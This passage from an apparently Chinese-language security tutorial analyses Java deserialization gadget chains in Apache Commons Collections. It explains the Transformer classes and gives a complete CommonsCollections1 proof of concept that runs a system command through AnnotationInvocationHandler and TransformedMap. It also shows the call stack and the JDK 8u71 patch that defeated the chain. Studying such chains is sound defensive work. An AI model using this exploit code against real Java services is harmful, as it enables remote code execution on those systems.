<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-的接口实现类"><a href="#Transformer-的接口实现类" class="headerlink" title="Transformer 的接口实现类"></a>Transformer 的接口实现类</h3><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code> 在构造函数的时候传入一个对象，并在 <code>transform</code> 方法将这个对象再返回：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>Transformer</code> 构造的代码执行流中，我们可以把 <code>ConstantTransformer</code> 理解为一个常量，可以返回一个确定的对象。</p>
<p>这样我们就可以屏蔽前面定义的 <code>readObject</code> 方法触发 <code>transform</code> 方法调用时传入的 <code>input</code> 参数对我们构造的 <code>Transformer</code> 构造的代码执行流产生影响。</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code> 可以对 <code>transform</code> 方法传入的对象参数用来执行任意方法，这也是反序列化能执行任意代码的关键。</p>
<p>在实例化这个 <code>InvokerTransformer</code> 时，需要传入三个参数：</p>
<ul>
<li><code>String methodName</code>：待执行的函数名</li>
<li><code>Class[] paramTypes</code>：这个函数的参数类型列表</li>
<li><code>Object[] args</code>：传给这个函数的参数列表<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
后面的回调 <code>transform</code> 方法，就是执行了 <code>input</code> 对象的 <code>iMethodName</code> 方法，并传入 <code>iArgs</code> 参数，即 <code>input.iMethod(iArgs)</code>。<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="type">InvocationTargetException</span> <span class="variable">ex</span> <span class="operator">=</span> var6;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="built_in">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p><code>InstantiateTransformer</code> 会把传入的 <code>input</code> 看做是一个 <code>Class</code> 对象，然后调用其对应的构造函数并传入指定参数来实例化一个对象。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                    + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InstantiationException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, ex);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code> 也是实现了 <code>Transformer</code> 接口的一个类，它的作用是将内部的多个 <code>Transformer</code> 串在一起。通俗来说就是，前一个回调返回的结果，作为后一个回调的参数传入。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="Transformer-构造代码执行流"><a href="#Transformer-构造代码执行流" class="headerlink" title="Transformer 构造代码执行流"></a>Transformer 构造代码执行流</h3><h4 id="构造任意代码执行"><a href="#构造任意代码执行" class="headerlink" title="构造任意代码执行"></a>构造任意代码执行</h4><p>根据前面对 <code>Transformer</code> 的介绍，我们可以将 <code>Runtime.getRuntime().exec(&quot;calc&quot;)</code> 拆解为 <code>runtime = Runtime.getRuntime()</code> 和 <code>runtime.exec(&quot;calc&quot;)</code> 两部分，因而有如下构造：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<p>然而由于 <code>Runtime</code> 对象没有实现 <code>Serializable</code> 接口，因此 <code>transformerChain</code> 对象是无法序列化的，因此我们还要把 <code>Runtime.getRuntime()</code> 拆解为 <code>getRuntime = Runtime.class.getMethod(&quot;getRuntime&quot;)</code> 和 <code>getRuntime.invoke(null)</code>。</p>
<p>由于 <code>InvokerTransformer</code> 内部会对传入的方法调用 <code>getMethod</code> 查找，因此构造 <code>InvokerTransformer</code> 时传入的参数类型需要严格按照传入的方法名对应的方法的定义来，且参数要和参数类型数量严格对应，这就是为什么实际上我们构造的是 <code>Runtime.class.getMethod(&quot;getRuntime&quot;, null)</code> 和 <code>getRuntime.invoke(null, null)</code> 。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h4 id="构造任意字节码加载"><a href="#构造任意字节码加载" class="headerlink" title="构造任意字节码加载"></a>构造任意字节码加载</h4><p><code>TemplatesImpl</code> 加载任意字节码有如下调用栈：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">main:34, DefineClassExample (com.example)</span><br></pre></td></tr></table></figure></div>
<p>因此我们只需要想办法让程序执行流程能够到达这个调用栈中任意一个函数即可，例如 <code>newTransformer</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="相关利用链"><a href="#相关利用链" class="headerlink" title="相关利用链"></a>相关利用链</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/5a4d01c1d0904b5c8444ceaa2cf42198.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"><a href="#CommonsCollections0（AnnotationInvocationHandler→TransformedMap）" class="headerlink" title="CommonsCollections0（AnnotationInvocationHandler→TransformedMap）"></a>CommonsCollections0（AnnotationInvocationHandler→TransformedMap）</h3><p><code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 中的 <code> memberValue.setValue</code> 会调用 <code>setValue</code> 方法，进而会调用到 <code>memberValues</code> 的 <code>transformer</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>不过这里需要绕过 <code>memberType != null</code> 判断，根据调试可知 <code>memberTypes</code> 中的 <code>key</code> 是构造时传入的 <code>type</code> 对应的类中的所有方法名字符串，而 <code>name</code> 是构造时传入的 <code>memberValues</code> 中的某个 <code>key</code>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">        superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>又因为 <code>type</code> 还要继承自 <code>Annotation</code>，因此因此我构造的时候 <code>type</code> 选择 <code>Retention.class</code> ，这样 <code>memberTypes</code> 中的键就有一个 <code>value</code> 字符串，此时我们预先在 <code>memberValues</code> 中存一个 <code>value</code> 字符串的键就可以执行到 <code>setValue</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the retention policy.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the retention policy</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>完整 poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(handler);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">checkSetValue:204, TransformedMap (org.apache.commons.collections.map)</span><br><span class="line">setValue:192, AbstractInputCheckedMapDecorator$MapEntry (org.apache.commons.collections.map)</span><br><span class="line">readObject:356, AnnotationInvocationHandler (sun.reflect.annotation)</span><br><span class="line">...</span><br><span class="line">main:36, CommonsCollections1 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>在 8u71 以后大概是 2015 年 12 月的时候，Java 官方<a class="link"   href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d" >修改 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>readObject</code> 函数。新版的 <code>readObject</code> 不再操作 <code>memberValues</code> 而是操作 <code>Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null)</code> ，因此 CC1 失效。</p>
<div class="highlight-container" data-rel="Diff"><figure class="iseeu highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">--- a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 08:58:28 2015 -0500</span></span><br><span class="line"><span class="comment">+++ b/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java	Tue Dec 01 22:38:16 2015 +0000</span></span><br><span class="line"><span class="meta">@@ -25,6 +25,7 @@</span></span><br><span class="line"> </span><br><span class="line"> package sun.reflect.annotation;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+import java.io.ObjectInputStream;</span></span><br><span class="line"> import java.lang.annotation.*;</span><br><span class="line"> import java.lang.reflect.*;</span><br><span class="line"> import java.io.Serializable;</span><br><span class="line"><span class="meta">@@ -425,35 +426,72 @@</span></span><br><span class="line"> </span><br><span class="line">     private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"><span class="deletion">-        s.defaultReadObject();</span></span><br><span class="line"><span class="addition">+        ObjectInputStream.GetField fields = s.readFields();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Class&lt;? extends Annotation&gt; t = (Class&lt;? extends Annotation&gt;)fields.get(&quot;type&quot;, null);</span></span><br><span class="line"><span class="addition">+        @SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; streamVals = (Map&lt;String, Object&gt;)fields.get(&quot;memberValues&quot;, null);</span></span><br><span class="line"> </span><br><span class="line">         // Check to make sure that types have not evolved incompatibly</span><br><span class="line"> </span><br><span class="line">         AnnotationType annotationType = null;</span><br><span class="line">         try &#123;</span><br><span class="line"><span class="deletion">-            annotationType = AnnotationType.getInstance(type);</span></span><br><span class="line"><span class="addition">+            annotationType = AnnotationType.getInstance(t);</span></span><br><span class="line">         &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">             // Class is no longer an annotation type; time to punch out</span><br><span class="line">             throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"><span class="addition">+        // consistent with runtime Map type</span></span><br><span class="line"><span class="addition">+        Map&lt;String, Object&gt; mv = new LinkedHashMap&lt;&gt;();</span></span><br><span class="line"> </span><br><span class="line">         // If there are annotation members without values, that</span><br><span class="line">         // situation is handled by the invoke method.</span><br><span class="line"><span class="deletion">-        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span></span><br><span class="line"><span class="addition">+        for (Map.Entry&lt;String, Object&gt; memberValue : streamVals.entrySet()) &#123;</span></span><br><span class="line">             String name = memberValue.getKey();</span><br><span class="line"><span class="addition">+            Object value = null;</span></span><br><span class="line">             Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">             if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line"><span class="deletion">-                Object value = memberValue.getValue();</span></span><br><span class="line"><span class="addition">+                value = 